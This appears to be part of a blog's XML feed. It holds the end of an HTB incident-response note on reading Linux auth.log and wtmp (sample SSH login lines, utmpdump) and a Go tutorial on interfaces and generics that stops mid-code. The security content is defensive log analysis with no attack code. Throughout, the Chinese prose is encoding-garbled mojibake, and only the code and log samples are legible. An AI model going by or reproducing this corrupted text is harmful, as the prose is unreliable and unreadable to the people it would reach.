title="Analysis"></a>Analysis</h1><h2 id="auth-log"><a href="#auth-log" class="headerlink" title="auth.log"></a>auth.log</h2><p>Linux ä¸­ <code>/var/log</code> ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œè®°å½•æ‰€æœ‰ä¸ç”¨æˆ·è®¤è¯ç›¸å…³çš„æ—¥å¿—ï¼Œæ¯”å¦‚è¯´ ssh </p><p>åƒ ssh ç™»å½•æˆåŠŸï¼ŒæŸ¥æ‰¾ç›¸å…³æ—¥å¿—å¯ä»¥è¿‡æ»¤ <code>Accepted password</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password <span class="hljs-keyword">for</span> root from 203.101.190.9 port 42825 ssh2<br></code></pre></td></tr></table></figure><p>ssh ç™»å½•å¤±è´¥ï¼Œç›¸å…³æ—¥å¿—å¯ä»¥è¿‡æ»¤ <code>Failed password</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Mar  6 06:31:33 ip-172-31-35-28 sshd[2334]: Failed password <span class="hljs-keyword">for</span> invalid user admin from 65.2.161.68 port 46454 ssh2<br></code></pre></td></tr></table></figure><p>çˆ†ç ´æ—¥å¿—å¯ä»¥çœ‹æ˜¯å¦æœ‰ä¸€æ®µè¿ç»­çš„ç™»å½•è¯·æ±‚</p><p>ç™»å½•ä¼šè¯å¼€å§‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Mar  6 06:18:01 ip-172-31-35-28 CRON[1119]: pam_unix(cron:session): session opened <span class="hljs-keyword">for</span> user confluence(uid=998) by (uid=0)<br></code></pre></td></tr></table></figure><p>ç™»å½•ä¼šè¯ç»“æŸ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Mar  6 06:18:01 ip-172-31-35-28 CRON[1118]: pam_unix(cron:session): session closed <span class="hljs-keyword">for</span> user confluence<br></code></pre></td></tr></table></figure><h2 id="wtmp"><a href="#wtmp" class="headerlink" title="wtmp"></a>wtmp</h2><p>è¯¦ç»†è§£é‡Šï¼š<a href="https://linuxhandbook.com/utmp-wtmp-btmp/">https://linuxhandbook.com/utmp-wtmp-btmp/</a></p><p>Linux ä¸­ <code>utmp</code> ã€<code>wtmp</code>ã€<code>btmp</code> æ–‡ä»¶éƒ½ç”¨äºå­˜å‚¨ç”¨æˆ·çš„ç™»å½•ä¿¡æ¯ï¼Œä½†æ¯ä¸ªæ–‡ä»¶éƒ½ä¸ä¸€æ ·ï¼Œæ–‡ä»¶å­˜å‚¨åœ¨ <code>/var/run</code> å’Œ <code>/var/log</code> ä¸­</p><ul><li><p>utmpï¼šè·Ÿè¸ªå½“å‰ç™»å½•çš„ç”¨æˆ·ï¼Œé»˜è®¤ç”± <code>who</code> å’Œ <code>w</code> æ˜¾ç¤ºå½“å‰ç™»å½•ç”¨æˆ·çš„ä¿¡æ¯ï¼Œ<code>uptime</code> è®°å½•ç³»ç»Ÿå¯åŠ¨æ—¶é—´ã€‚</p></li><li><p>wtmpï¼šè·Ÿè¸ªæ¯æ¬¡ç™»å½•å’Œå†å²ç™»å½•ç³»ç»Ÿçš„ç”¨æˆ·ä¿¡æ¯ï¼Œé»˜è®¤ç”± <code>last</code> å‘½ä»¤æŸ¥çœ‹ã€‚</p></li><li><p>btmpï¼šè®°å½•å¤±è´¥çš„å°è¯•ç™»å½•ä¿¡æ¯ï¼Œé»˜è®¤ç”± <code>lastb</code> å‘½ä»¤æŸ¥çœ‹ã€‚</p></li></ul><p>é¢˜ç›®ä¸­ç»™å‡ºçš„ <code>wtmp</code> æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤è¯»å–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">utmpdump /var/log/wtmp<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>åº”æ€¥å“åº”&amp;å–è¯</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>åº”æ€¥å“åº”</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Re:ä»é›¶å¼€å§‹çš„ Go ä¹‹æ—…- åŸºç¡€(4)</title>
    <link href="/2025/03/23/Go-4/"/>
    <url>/2025/03/23/Go-4/</url>
    
    <content type="html"><![CDATA[<p>â€¦ing</p><span id="more"></span><h1 id="æ¥å£"><a href="#æ¥å£" class="headerlink" title="æ¥å£"></a>æ¥å£</h1><p>æ¥å£åªå®šä¹‰è€Œä¸å®ç°</p><h2 id="æ¥å£ç±»å‹"><a href="#æ¥å£ç±»å‹" class="headerlink" title="æ¥å£ç±»å‹"></a>æ¥å£ç±»å‹</h2><p>Go ä¸­çš„æ¥å£ï¼ˆinterfaceï¼‰æ˜¯ä¸€ç§æŠ½è±¡çš„ç±»å‹ï¼Œinterface æ˜¯ä¸€ç»„æ–¹æ³•çš„é›†åˆ</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">Basic Interface:åªè¦åŒ…å«æ–¹æ³•é›†çš„æ¥å£<br>General Interface:åªè¦åŒ…å«ç±»å‹é›†çš„æ¥å£<br></code></pre></td></tr></table></figure><h2 id="æ¥å£å£°æ˜"><a href="#æ¥å£å£°æ˜" class="headerlink" title="æ¥å£å£°æ˜"></a>æ¥å£å£°æ˜</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> æ¥å£ç±»å‹å <span class="hljs-keyword">interface</span>&#123;<br>    æ–¹æ³•å<span class="hljs-number">1</span>( å‚æ•°åˆ—è¡¨<span class="hljs-number">1</span> ) è¿”å›å€¼åˆ—è¡¨<span class="hljs-number">1</span><br>    æ–¹æ³•å<span class="hljs-number">2</span>( å‚æ•°åˆ—è¡¨<span class="hljs-number">2</span> ) è¿”å›å€¼åˆ—è¡¨<span class="hljs-number">2</span><br>     â€¦<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œå®šä¹‰äº† <code>Animal</code> æ¥å£ï¼Œ<code>dog</code>  å’Œ <code>cat</code>  ç»“æ„ä½“ï¼Œå®ç° <code>Say()</code> æ–¹æ³•ï¼Œå®ç°è¯¥æ¥å£çš„å®ä¾‹</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Animal <span class="hljs-keyword">interface</span> &#123;<br>Say()<br>&#125;<br><span class="hljs-keyword">type</span> dog <span class="hljs-keyword">struct</span>&#123;&#125;<br><span class="hljs-keyword">type</span> cat <span class="hljs-keyword">struct</span>&#123;&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(d dog)</span></span> Say() &#123;<br>fmt.Println(<span class="hljs-string">&quot;www&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c cat)</span></span> Say() &#123;<br>fmt.Println(<span class="hljs-string">&quot;mmm&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> hay Animal<br>a := cat&#123;&#125;<br>b := dog&#123;&#125;<br>hay = a<br>hay.Say()<br>hay = b<br>hay.Say()<br>&#125;<br><br>&gt;&gt;<br>mmm<br>www<br></code></pre></td></tr></table></figure><h2 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h2><p>æ–¹æ³•é›†æ˜¯æ¥å£æ–¹æ³•çš„è¶…é›†ï¼Œå®ç°æ–¹æ³•ä¸éœ€è¦ <code>implements</code> å…³é”®å­—æŒ‡å®šå®ç°ï¼Œåªè¦æ˜¯å®ç°äº†ä¸€ä¸ªæ¥å£çš„å…¨éƒ¨æ–¹æ³•ï¼Œé‚£å°±æ˜¯å®ç°äº†è¯¥æ¥å£ï¼Œ</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">interface</span> &#123;<br>Say(<span class="hljs-type">string</span>) <span class="hljs-type">string</span><br>Walk(<span class="hljs-type">int</span>)<br>&#125;<br><br><span class="hljs-keyword">type</span> Man <span class="hljs-keyword">interface</span> &#123;<br>Exercise()<br>Person<br>&#125;<br><span class="hljs-keyword">type</span> Number <span class="hljs-type">int</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(n Number)</span></span> Say(s <span class="hljs-type">string</span>) <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;bibibibibi&quot;</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(n Number)</span></span> Walk(i <span class="hljs-type">int</span>) &#123;<br>fmt.Println(<span class="hljs-string">&quot;can not walk&quot;</span>)<br>&#125;<br><br><span class="hljs-keyword">type</span> Func <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(f Func)</span></span> Say(s <span class="hljs-type">string</span>) <span class="hljs-type">string</span> &#123;<br>f()<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;bibibibibi&quot;</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(f Func)</span></span> Walk(i <span class="hljs-type">int</span>) &#123;<br>f()<br>fmt.Println(<span class="hljs-string">&quot;can not walk&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> function Func<br>function = <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;do somthing&quot;</span>)<br>&#125;<br>function()<br>&#125;<br>&gt;&gt;<br>do somthing<br></code></pre></td></tr></table></figure><p>ä¸Šé¢è¿™ä¸ªä¾‹å­ä¸­ï¼Œ<code>Man</code>  æ–¹æ³•æ˜¯ <code>Person</code> æ–¹æ³•çš„è¶…é›†ï¼Œæ‰€ä»¥ <code>Man</code> ä¹Ÿå®ç°äº†æ¥å£ <code>Person</code>ï¼›ç±»å‹ <code>Number</code> æ˜¯ <code>int</code> ï¼Œ<code>Number</code> æ–¹æ³•ä¹Ÿæ˜¯ <code>Person</code> çš„è¶…é›†ã€‚å‡½æ•°ç±»å‹ä¹Ÿèƒ½å®ç°æ¥å£ã€‚</p><h2 id="ç©ºæ¥å£"><a href="#ç©ºæ¥å£" class="headerlink" title="ç©ºæ¥å£"></a>ç©ºæ¥å£</h2><p>ç©ºæ¥å£æ˜¯æ‰€æœ‰ç±»å‹é›†çš„é›†åˆï¼ŒåŒ…å«æ‰€æœ‰ç±»å‹</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Any <span class="hljs-keyword">interface</span>&#123;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Any</code> æ¥å£å†…éƒ¨æ²¡ç”¨æ–¹æ³•é›†åˆï¼Œæ‰€æœ‰ç±»å‹éƒ½æ˜¯ <code>Any</code> æ¥å£çš„å®ç°ï¼Œæ‰€æœ‰ç±»å‹çš„æ–¹æ³•éƒ½æ˜¯ç©ºé›†çš„è¶…é›†ï¼Œ<code>Any</code> å¯ä»¥ä¿å­˜ä»»ä½•ç±»å‹çš„å€¼</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Any <span class="hljs-keyword">interface</span> &#123;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> anything Any<br><br>anything = <span class="hljs-number">1</span><br><span class="hljs-built_in">println</span>(anything)<br>fmt.Println(anything)<br><br>anything = <span class="hljs-string">&quot;sad&quot;</span><br><span class="hljs-built_in">println</span>(anything)<br>fmt.Println(anything)<br><br>anything = <span class="hljs-built_in">complex</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br><span class="hljs-built_in">println</span>(anything)<br>fmt.Println(anything)<br><br>anything = <span class="hljs-number">1.2</span><br><span class="hljs-built_in">println</span>(anything)<br>fmt.Println(anything)<br><br>anything = []<span class="hljs-type">int</span>&#123;&#125;<br><span class="hljs-built_in">println</span>(anything)<br>fmt.Println(anything)<br><br>anything = <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;&#125;<br><span class="hljs-built_in">println</span>(anything)<br>fmt.Println(anything)<br>&#125;<br>&gt;&gt;<br>(<span class="hljs-number">0x9f23e0</span>,<span class="hljs-number">0xa2f968</span>)<br><span class="hljs-number">1</span><br>(<span class="hljs-number">0x9f21a0</span>,<span class="hljs-number">0xa307e0</span>)<br>sad<br>(<span class="hljs-number">0x9f24e0</span>,<span class="hljs-number">0xa307f0</span>)<br>(<span class="hljs-number">1</span>+<span class="hljs-number">2i</span>)<br>(<span class="hljs-number">0x9f2560</span>,<span class="hljs-number">0xa30698</span>)<br><span class="hljs-number">1.2</span><br>(<span class="hljs-number">0x9f1560</span>,<span class="hljs-number">0xc000008030</span>)<br>[]<br>(<span class="hljs-number">0x9f6480</span>,<span class="hljs-number">0xc00001e180</span>)<br><span class="hljs-keyword">map</span>[]<br></code></pre></td></tr></table></figure><p>ä¸¤ç§è¾“å‡ºç»“æœä¸ä¸€æ ·ï¼Œæ¥å£å†…éƒ¨å¯ä»¥çœ‹æˆç”±<code>(val,type)</code> ç»„æˆçš„å…ƒç»„ï¼Œåœ¨è°ƒç”¨æ–¹æ³•çš„æ—¶å€™ä¼šè°ƒç”¨å…·ä½“ç±»å‹çš„å…·ä½“å€¼</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">interface</span>&#123;&#125;<br></code></pre></td></tr></table></figure><p>ä¸€ä¸ªåŒ¿åç©ºæ¥å£ï¼Œè¡¨ç¤ºæ¥æ”¶ä»»ä½•ç±»å‹çš„å€¼</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> any = <span class="hljs-keyword">interface</span>&#123;&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a <span class="hljs-keyword">interface</span>&#123;&#125;<br><span class="hljs-keyword">var</span> b <span class="hljs-keyword">interface</span>&#123;&#125;<br>a = <span class="hljs-number">1</span><br>b = <span class="hljs-string">&quot;1&quot;</span><br>fmt.Println(a == b)<br>a = <span class="hljs-number">1</span><br>b = <span class="hljs-number">1</span><br>fmt.Println(a == b)<br>&#125;<br>&gt;&gt;<br><span class="hljs-literal">false</span><br><span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>æ¯”è¾ƒç©ºæ¥å£æ—¶ï¼Œå…ˆæ¯”è¾ƒåº•å±‚ç±»å‹ï¼Œå¦‚æœç±»å‹ä¸åŒ¹é…çš„è¯åˆ™ä¸º <code>false</code>ï¼Œç„¶åå†æ¯”è¾ƒå€¼</p><p>å¦‚æœåº•å±‚ç±»å‹ä¸èƒ½æ¯”è¾ƒä¼š <code>panic</code>ï¼Œ<code>comparable</code> ä»£è¡¨æ‰€æœ‰å¯æ¯”è¾ƒç±»å‹</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> comparable <span class="hljs-keyword">interface</span>&#123; comparable &#125;<br></code></pre></td></tr></table></figure><h2 id="å€¼æ¥æ”¶å®ç°æ¥å£"><a href="#å€¼æ¥æ”¶å®ç°æ¥å£" class="headerlink" title="å€¼æ¥æ”¶å®ç°æ¥å£"></a>å€¼æ¥æ”¶å®ç°æ¥å£</h2><p>å€¼æ¥æ”¶è€…å®ç°æ¥å£ä¹‹åï¼Œä¸ç®¡æ˜¯ dog ç»“æ„ä½“è¿˜æ˜¯ç»“æ„ä½“æŒ‡é’ˆ <code>*dog</code>ç±» å‹çš„å˜é‡éƒ½å¯ä»¥èµ‹å€¼ç»™è¯¥æ¥å£å˜é‡</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Mover <span class="hljs-keyword">interface</span> &#123;<br>move()<br>&#125;<br><span class="hljs-keyword">type</span> dog <span class="hljs-keyword">struct</span>&#123;&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(d dog)</span></span> move() &#123;<br>fmt.Println(<span class="hljs-string">&quot;run&quot;</span>)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> x Mover<br><span class="hljs-keyword">var</span> a = dog&#123;&#125;  <span class="hljs-comment">// a æ˜¯ dog ç±»å‹</span><br>x = a          <span class="hljs-comment">// x å¯ä»¥æ¥æ”¶ dog ç±»å‹</span><br><span class="hljs-keyword">var</span> b = &amp;dog&#123;&#125; <span class="hljs-comment">// b æ˜¯ *dog ç±»å‹</span><br>x = b          <span class="hljs-comment">// x å¯ä»¥æ¥æ”¶ *dog ç±»å‹</span><br>x.move()<br>&#125;<br>&gt;&gt;<br>run<br></code></pre></td></tr></table></figure><h2 id="æŒ‡é’ˆæ¥æ”¶å®ç°æ¥å£"><a href="#æŒ‡é’ˆæ¥æ”¶å®ç°æ¥å£" class="headerlink" title="æŒ‡é’ˆæ¥æ”¶å®ç°æ¥å£"></a>æŒ‡é’ˆæ¥æ”¶å®ç°æ¥å£</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Mover <span class="hljs-keyword">interface</span> &#123;<br>move()<br>&#125;<br><span class="hljs-keyword">type</span> dog <span class="hljs-keyword">struct</span>&#123;&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(d *dog)</span></span> move() &#123;<br>fmt.Println(<span class="hljs-string">&quot;run&quot;</span>)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> x Mover<br><span class="hljs-comment">//var a = dog&#123;&#125;  // a æ˜¯ dog ç±»å‹</span><br><span class="hljs-comment">//x = a          // x å¯ä»¥æ¥æ”¶ dog ç±»å‹</span><br><span class="hljs-keyword">var</span> b = &amp;dog&#123;&#125; <span class="hljs-comment">// b æ˜¯ *dog ç±»å‹</span><br>x = b          <span class="hljs-comment">// x å¯ä»¥æ¥æ”¶ *dog ç±»å‹</span><br>x.move()<br>&#125;<br>&gt;&gt;<br>run<br></code></pre></td></tr></table></figure><p>Mover æ¥å£çš„æ˜¯ <code>*dog</code> ç±»å‹ï¼Œæ‰€ä»¥ä¸èƒ½ç»™ x ä¼ å…¥ dog ç±»å‹çš„ aï¼Œæ­¤æ—¶ x åªèƒ½å­˜å‚¨ <code>*dog</code> ç±»å‹çš„å€¼ã€‚</p><h1 id="æ³›å‹"><a href="#æ³›å‹" class="headerlink" title="æ³›å‹"></a>æ³›å‹</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Sum</span>[<span class="hljs-title">T</span> <span class="hljs-title">int</span> | <span class="hljs-title">float64</span>]<span class="hljs-params">(a, b T)</span></span> T &#123;<br>   <span class="hljs-keyword">return</span> a + b<br>&#125;<br><br><span class="hljs-comment">//T æ˜¯ç±»å‹å½¢å‚ï¼Œå–å†³äºä¼ è¿›æ¥çš„ç±»å‹</span><br><span class="hljs-comment">//int | float64 æ„æˆäº†ç±»å‹çº¦æŸï¼Œè§„å®šäº†å…è®¸çš„ç±»å‹</span><br><span class="hljs-comment">//Sum[int]() æŒ‡å®š int ç±»å‹</span><br></code></pre></td></tr></table></figure><p>æ˜¾å¼æŒ‡æ˜ç”¨å“ªç§ç±»å‹</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">Sum[<span class="hljs-type">int</span>](<span class="hljs-number">2012</span>, <span class="hljs-number">2022</span>)<br></code></pre></td></tr></table></figure><p>ä¸æŒ‡å®šç±»å‹</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">Sum(<span class="hljs-number">1.23</span>,<span class="hljs-number">1.14514</span>)<br></code></pre></td></tr></table></figure><p>æ³›å‹åˆ‡ç‰‡ï¼Œç±»å‹çº¦æŸ <code>int | int32 | int64</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> GenercSlice[T <span class="hljs-type">int</span> | <span class="hljs-type">int32</span> | <span class="hljs-type">int64</span>] []T<br></code></pre></td></tr></table></figure><p>ä¸èƒ½çœç•¥ç±»å‹å®å‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">GenercSlice[<span class="hljs-type">int</span>]&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;<br></code></pre></td></tr></table></figure><p>æ³›å‹å“ˆå¸Œè¡¨ï¼Œé”®çš„ç±»å‹å¿…é¡»å¯æ¯”è¾ƒï¼Œä½¿ç”¨ <code>comparable</code> æ¥å£ï¼Œå€¼çš„ç±»å‹çº¦æŸä¸º <code>V int | string | byte</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> GenericMap[K comparable,V <span class="hljs-type">int</span> | <span class="hljs-type">string</span> | <span class="hljs-type">byte</span>] <span class="hljs-keyword">map</span>[K]V<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨å¦‚ä¸‹</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> GenericMap[K comparable, V <span class="hljs-type">int</span> | <span class="hljs-type">string</span> | <span class="hljs-type">byte</span>] <span class="hljs-keyword">map</span>[K]V<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> gmap1 = GenericMap[<span class="hljs-type">int</span>, <span class="hljs-type">string</span>]&#123;<span class="hljs-number">1</span>: <span class="hljs-string">&quot;sad&quot;</span>&#125;<br><span class="hljs-keyword">var</span> gmap2 = <span class="hljs-built_in">make</span>(GenericMap[<span class="hljs-type">string</span>, <span class="hljs-type">byte</span>], <span class="hljs-number">0</span>)<br><br>fmt.Println(gmap1)<br>fmt.Printf(<span class="hljs-string">&quot;gmap2: %#v\n&quot;</span>, gmap2)<br>&#125;<br>&gt;&gt;<br><span class="hljs-keyword">map</span>[<span class="hljs-number">1</span>:sad]<br>gmap2: main.GenericMap[<span class="hljs-type">string</span>,<span class="hljs-type">uint8</span>]&#123;&#125;<br></code></pre></td></tr></table></figure><p>æ³›å‹ç»“æ„ä½“ï¼Œçº¦æŸç±»å‹ä¸º <code>T int | string</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> GenericStruct[T <span class="hljs-type">int</span> | <span class="hljs-type">string</span>] <span class="hljs-keyword">struct</span> &#123;<br>Name <span class="hljs-type">string</span><br>Id   T<br>&#125;<br></code></pre></td></tr></table></figure><p><code>SayAble</code> æ˜¯ä¸€ä¸ªæ³›å‹æ¥å£ï¼Œ<code>Person</code> å®ç°äº†è¯¥æ¥å£</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> SayAble[T <span class="hljs-type">int</span> | <span class="hljs-type">string</span>] <span class="hljs-keyword">interface</span> &#123;<br>Say() T<br>&#125;<br><span class="hljs-keyword">type</span> Person[T <span class="hljs-type">int</span> | <span class="hljs-type">string</span>] <span class="hljs-keyword">struct</span> &#123;<br>msg T<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p Person[T])</span></span> Say() T 